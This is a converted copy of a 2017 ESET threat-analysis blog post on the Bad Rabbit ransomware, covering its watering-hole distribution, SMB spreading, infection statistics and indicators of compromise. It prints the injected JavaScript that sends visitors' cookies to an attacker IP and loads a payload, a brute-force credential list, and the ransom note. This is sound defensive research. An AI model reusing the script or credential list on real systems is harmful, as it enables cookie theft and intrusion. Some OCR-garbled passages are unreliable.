## Critical Infrastructure

# Bad Rabbit: Not-Petya is back with improved ransomware

A new ransomware outbreak today has hit some major infrastructure in Ukraine including Kiev metro. Here are some details about this new variant of Petya.

![](_page_0_Picture_5.jpeg)

Marc-Etienne M.Léveillé

24 Oct 2017 , 4 min. read

![](_page_0_Picture_8.jpeg)

# Your account, your cookies choice

We and our partners use cookies to give you the best optimized online experience, analyze our website traffic, and serve you with personalized ads. You can agree to the collection of all cookies by clicking "Accept all and close" or adjust your cookie settings by clicking "Manage cookies". You also have the right to withdraw your consent to cookies anytime. For more information, please see our Cookie Policy.

Accept all and close

Manage cookies

![](_page_1_Picture_0.jpeg)

UPDATE (October 27 - 15:35 CEST): A new report suggested that EternalRomance - one of the leaked NSA tools - has been used to spread Diskcoder.D in the network. We were able to confirm this by installing the out-of-life-cycle patch MS17-010 (a patch addressing vulnerabilities misused by the leaked NSA exploits), which stopped the further spread of the malware via IPC share.

A new ransomware outbreak today and has hit some major infrastructure in Ukraine including Kiev metro. Here are some of the details about this new variant.

# Drive-by download via watering hole on popular sites

One of the distribution method of Bad Rabbit is via drive-by download. Some popular websites are compromised and have JavaScript injected in their HTML body or in one of their . js files.

![](_page_2_Picture_4.jpeg)

```
11 | : : WITHOW . A.TENTELLINEUREST | |
  xhr = new XMLHttpRequest();
} else if (!!window.ActiveXObject) {
  var xhrs = ['Microsoft.XMLHTTP', 'Msxml2.XMLHTTP', 'Msxml2.XMLHTTP.3.0'
  for (var i = 0; i < xhrs.length; i++) {
    try {
      xhr = ActiveXObject(xhrs[i]);
      break;
    } catch (e) {}
  }
}
if (!!xhr) {
  xhr.open('POST', '
  xhr.timeout = 10000;
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      var resp = xhr.responseText;
      if (resp) {
        var fans = JSON.parse(resp);
        if (fans) {
          var an_s = decodeURIComponent(fans.InjectionString).replace(/\+
          var da = document.createElement('div');
          da.id = 'ans';
          da.innerHTML = an_s;
          document.body.appendChild(da);
        }
      }
```
![](_page_3_Picture_1.jpeg)

```
SANILLINA SIINIIIS
  'c state': !!document.cookie
});
```
This script reports the following to 185.149.120[.]3, which doesn't seem to respond at the moment.

- ೦ Browser User-Agent
- O Referrer
- O Cookie from the visited site
- O Domain name of the visited site

Server side logic can determine if the visitor is of interest and then add content to the page. In that case, what we have seen is that a popup asking to download an update for Flash Player is shown in the middle of the page.

![](_page_4_Picture_7.jpeg)

table file from ll flash player.exe Is the ATTA BOLLIP GISEL TO TO GITAN OLLER

#### Dops! Your files have been encrypted. If you see this text, your files are no longer accessible. You might have been looking for a way to recover your files. Don't waste your time. No one will be able to recover them without our decryption service. We guarantee that you can recover all your files safely. All you need to do is submit the payment and get the decryption password. Visit our web service at caforssztxqzf2nm.onion Your personal installation key#1: 20RqoZdoI+vr6yMqMlccRe/TmI+r+JNFX60UpZd+RHZ67xJ2b/5/UU5bzvMQkRSX FF3rcIQIKAD1HoaAcxCTupQyH9VyGnk1FxP35vszHqArN7/MEMtXb8bb7BMSbJx8 6thxIi0FSIRUPr+IZXm2tR938ohkDAhJMkroU+xBLByIggScJGN1UXL44jj7HcLJi Ba3a/AC0Sgjb4tsGfXUTFft19Muik6VmLgoz4XAYwgHyJLPD/69P7Jq80AUJyBxN EKheR2bz17LrpUcrg6DfnT4qE5J310PErfE/3fxLhc20293tcwhGrNinxsF4bL81 7M02LsCle0UNG/NgH1qK05SUpBAMiqY9Ug== If you have already got the password, please enter it below. Password#1:

The payment page:

![](_page_5_Picture_3.jpeg)

# Spreading via SMB

Win32/Diskcoder.D has the ability to spread via SMB. As opposed to some public claims, it does not use the EternalBlue vulnerability like the Win32/Diskcoder.C (Not-Petya) outbreak. First, it scans internal networks for open SMB shares. It looks for the following shares:

| O admin    |
|------------|
| O atsvc    |
| O browser  |
| O eventlog |
| O Isarpc   |
| O netlogon |
| O ntsvcs   |
| O spoolss  |
| • samr     |

O srvsvc

![](_page_6_Picture_4.jpeg)

# Your account, your cookies choice

We and our partners use cookies to give you the best optimized online experience, analyze our website traffic, and serve you with personalized ads. You can agree to the collection of all cookies by clicking "Accept all and close" or adjust your cookie settings by clicking "Manage cookies". You also have the right to withdraw your consent to cookies anytime. For more information, please see our Cookie Policy.

rest credentials. A hardcoded

| Guest                                       | Guest     |  |  |
|---------------------------------------------|-----------|--|--|
| User                                        | guest     |  |  |
| Userl                                       | User      |  |  |
| user-1                                      | user      |  |  |
| Test                                        | Admin     |  |  |
| root                                        | adminTest |  |  |
| buh                                         | test      |  |  |
| boss                                        | root      |  |  |
| ftp                                         | 123       |  |  |
| rdp                                         | 1234      |  |  |
| rdpuser                                     | 12345     |  |  |
| rdpadmin                                    | 123456    |  |  |
| Your account, your cookies<br>choice<br>0 0 |           |  |  |

| asus      | GuestIZ3        |
|-----------|-----------------|
| ftpuser   | guest123        |
| ftpadmin  | User123         |
| nas       | user123         |
| nasuser   | Admin123        |
| nasadmin  | admin123Test123 |
| superuser | test123         |
| netguest  | password        |
| alex      | רווורר          |
|           | ടടടട            |
|           | 77777           |
|           | 777             |

![](_page_8_Picture_2.jpeg)

| ZXC    |
|--------|
| zxc123 |
| zxc321 |
| ZXCV   |
| uiop   |
| 123321 |
| 321    |
| love   |
| secret |
| sex    |
| god    |

![](_page_9_Picture_1.jpeg)

We and our partners use cookies to give you the best optimized online experience, analyze our website traffic, and serve you with personalized ads. You can agree to the collection of all cookies by clicking "Accept all and close" or adjust your cookie settings by clicking "Manage cookies". You also have the right to withdraw your consent to cookies anytime. For more information, please see our Cookie Policy.

dropped into the Windows e.

i. Bugs in file encryption were legitimate software used to do ndom and then protected by a

Interestingly, ESET telemetry shows that Ukraine accounts only for 12.2% of the total number of times we have seen the dropper component Here are the statistics:

- O Russia: 65%
- O Ukraine: 12.2%
- O Bulgaria: 10.2%
- O Turkey: 6.4%
- O Japan: 3.8%
- O Other: 2.4%

This pretty much matches the distribution of compromised websites that include the malicious JavaScript. So why does Ukraine seem to be more hit than the rest?

It's interesting to note that all these big companies were all hit at the same time. It is possible that the group already had a foot inside their network and launched the watering hole attack at the same time as a decoy. Nothing says they fell for the "Flash update". ESET is still investigating and we will post our finding as we discover them.

# Samples

![](_page_10_Figure_10.jpeg)

Win32/Diskcoder.D

exe

# C&C servers

Payment site: 

Inject URL: 

Distribution URL:hxxp://1dnscontrol[.]com/flash\_install.php

List of compromised sites:

- hxxp://argumentiru[.]com
- 0 hxxp://www.fontanka[.]ru
- hxxp://grupovo[.]bg
- hxxp://www.sinematurk[.]com
- 0 hxxp://www.aica.co[.]jp
- 0 hxxp://spbvoditel[.]ru

![](_page_11_Picture_13.jpeg)

## Your account, your cookies choice

- Ο hxxp://www.grupovo[.]bg
- hxxp://www.pensionhotel[.]cz
- 0 hxxp://www.online812[.]ru
- 0 hxxp://www.imer[.]ro
- hxxp://novayagazeta.spb[.]ru
- 0 hxxp://i24.com[.]ua
- hxxp://bg.pensionhotel[.]com
- ◎ hxxp://ankerch-crimea[.]ru

# Let us keep you up to date

Sign up for our newsletters

Your Email Address

Ukraine Crisis newsletter

![](_page_12_Picture_12.jpeg)

### Your account, your cookies choice

#### Business Security | Ransomware

Resilience in the face of ransomware: A key to business survival

#### Critical Infrastructure

When IT meets OT: Cybersecurity for the physical world

#### Video Ransomware

CosmicBeetle joins the ranks of RansomHub affiliates - Week in security with Tony Anscombe

![](_page_13_Picture_6.jpeg)

## Your account, your cookies choice

### What do you think?

0 Responses

![](_page_14_Picture_2.jpeg)

Login v

#### 0 Comments

![](_page_14_Picture_4.jpeg)

![](_page_14_Picture_5.jpeg)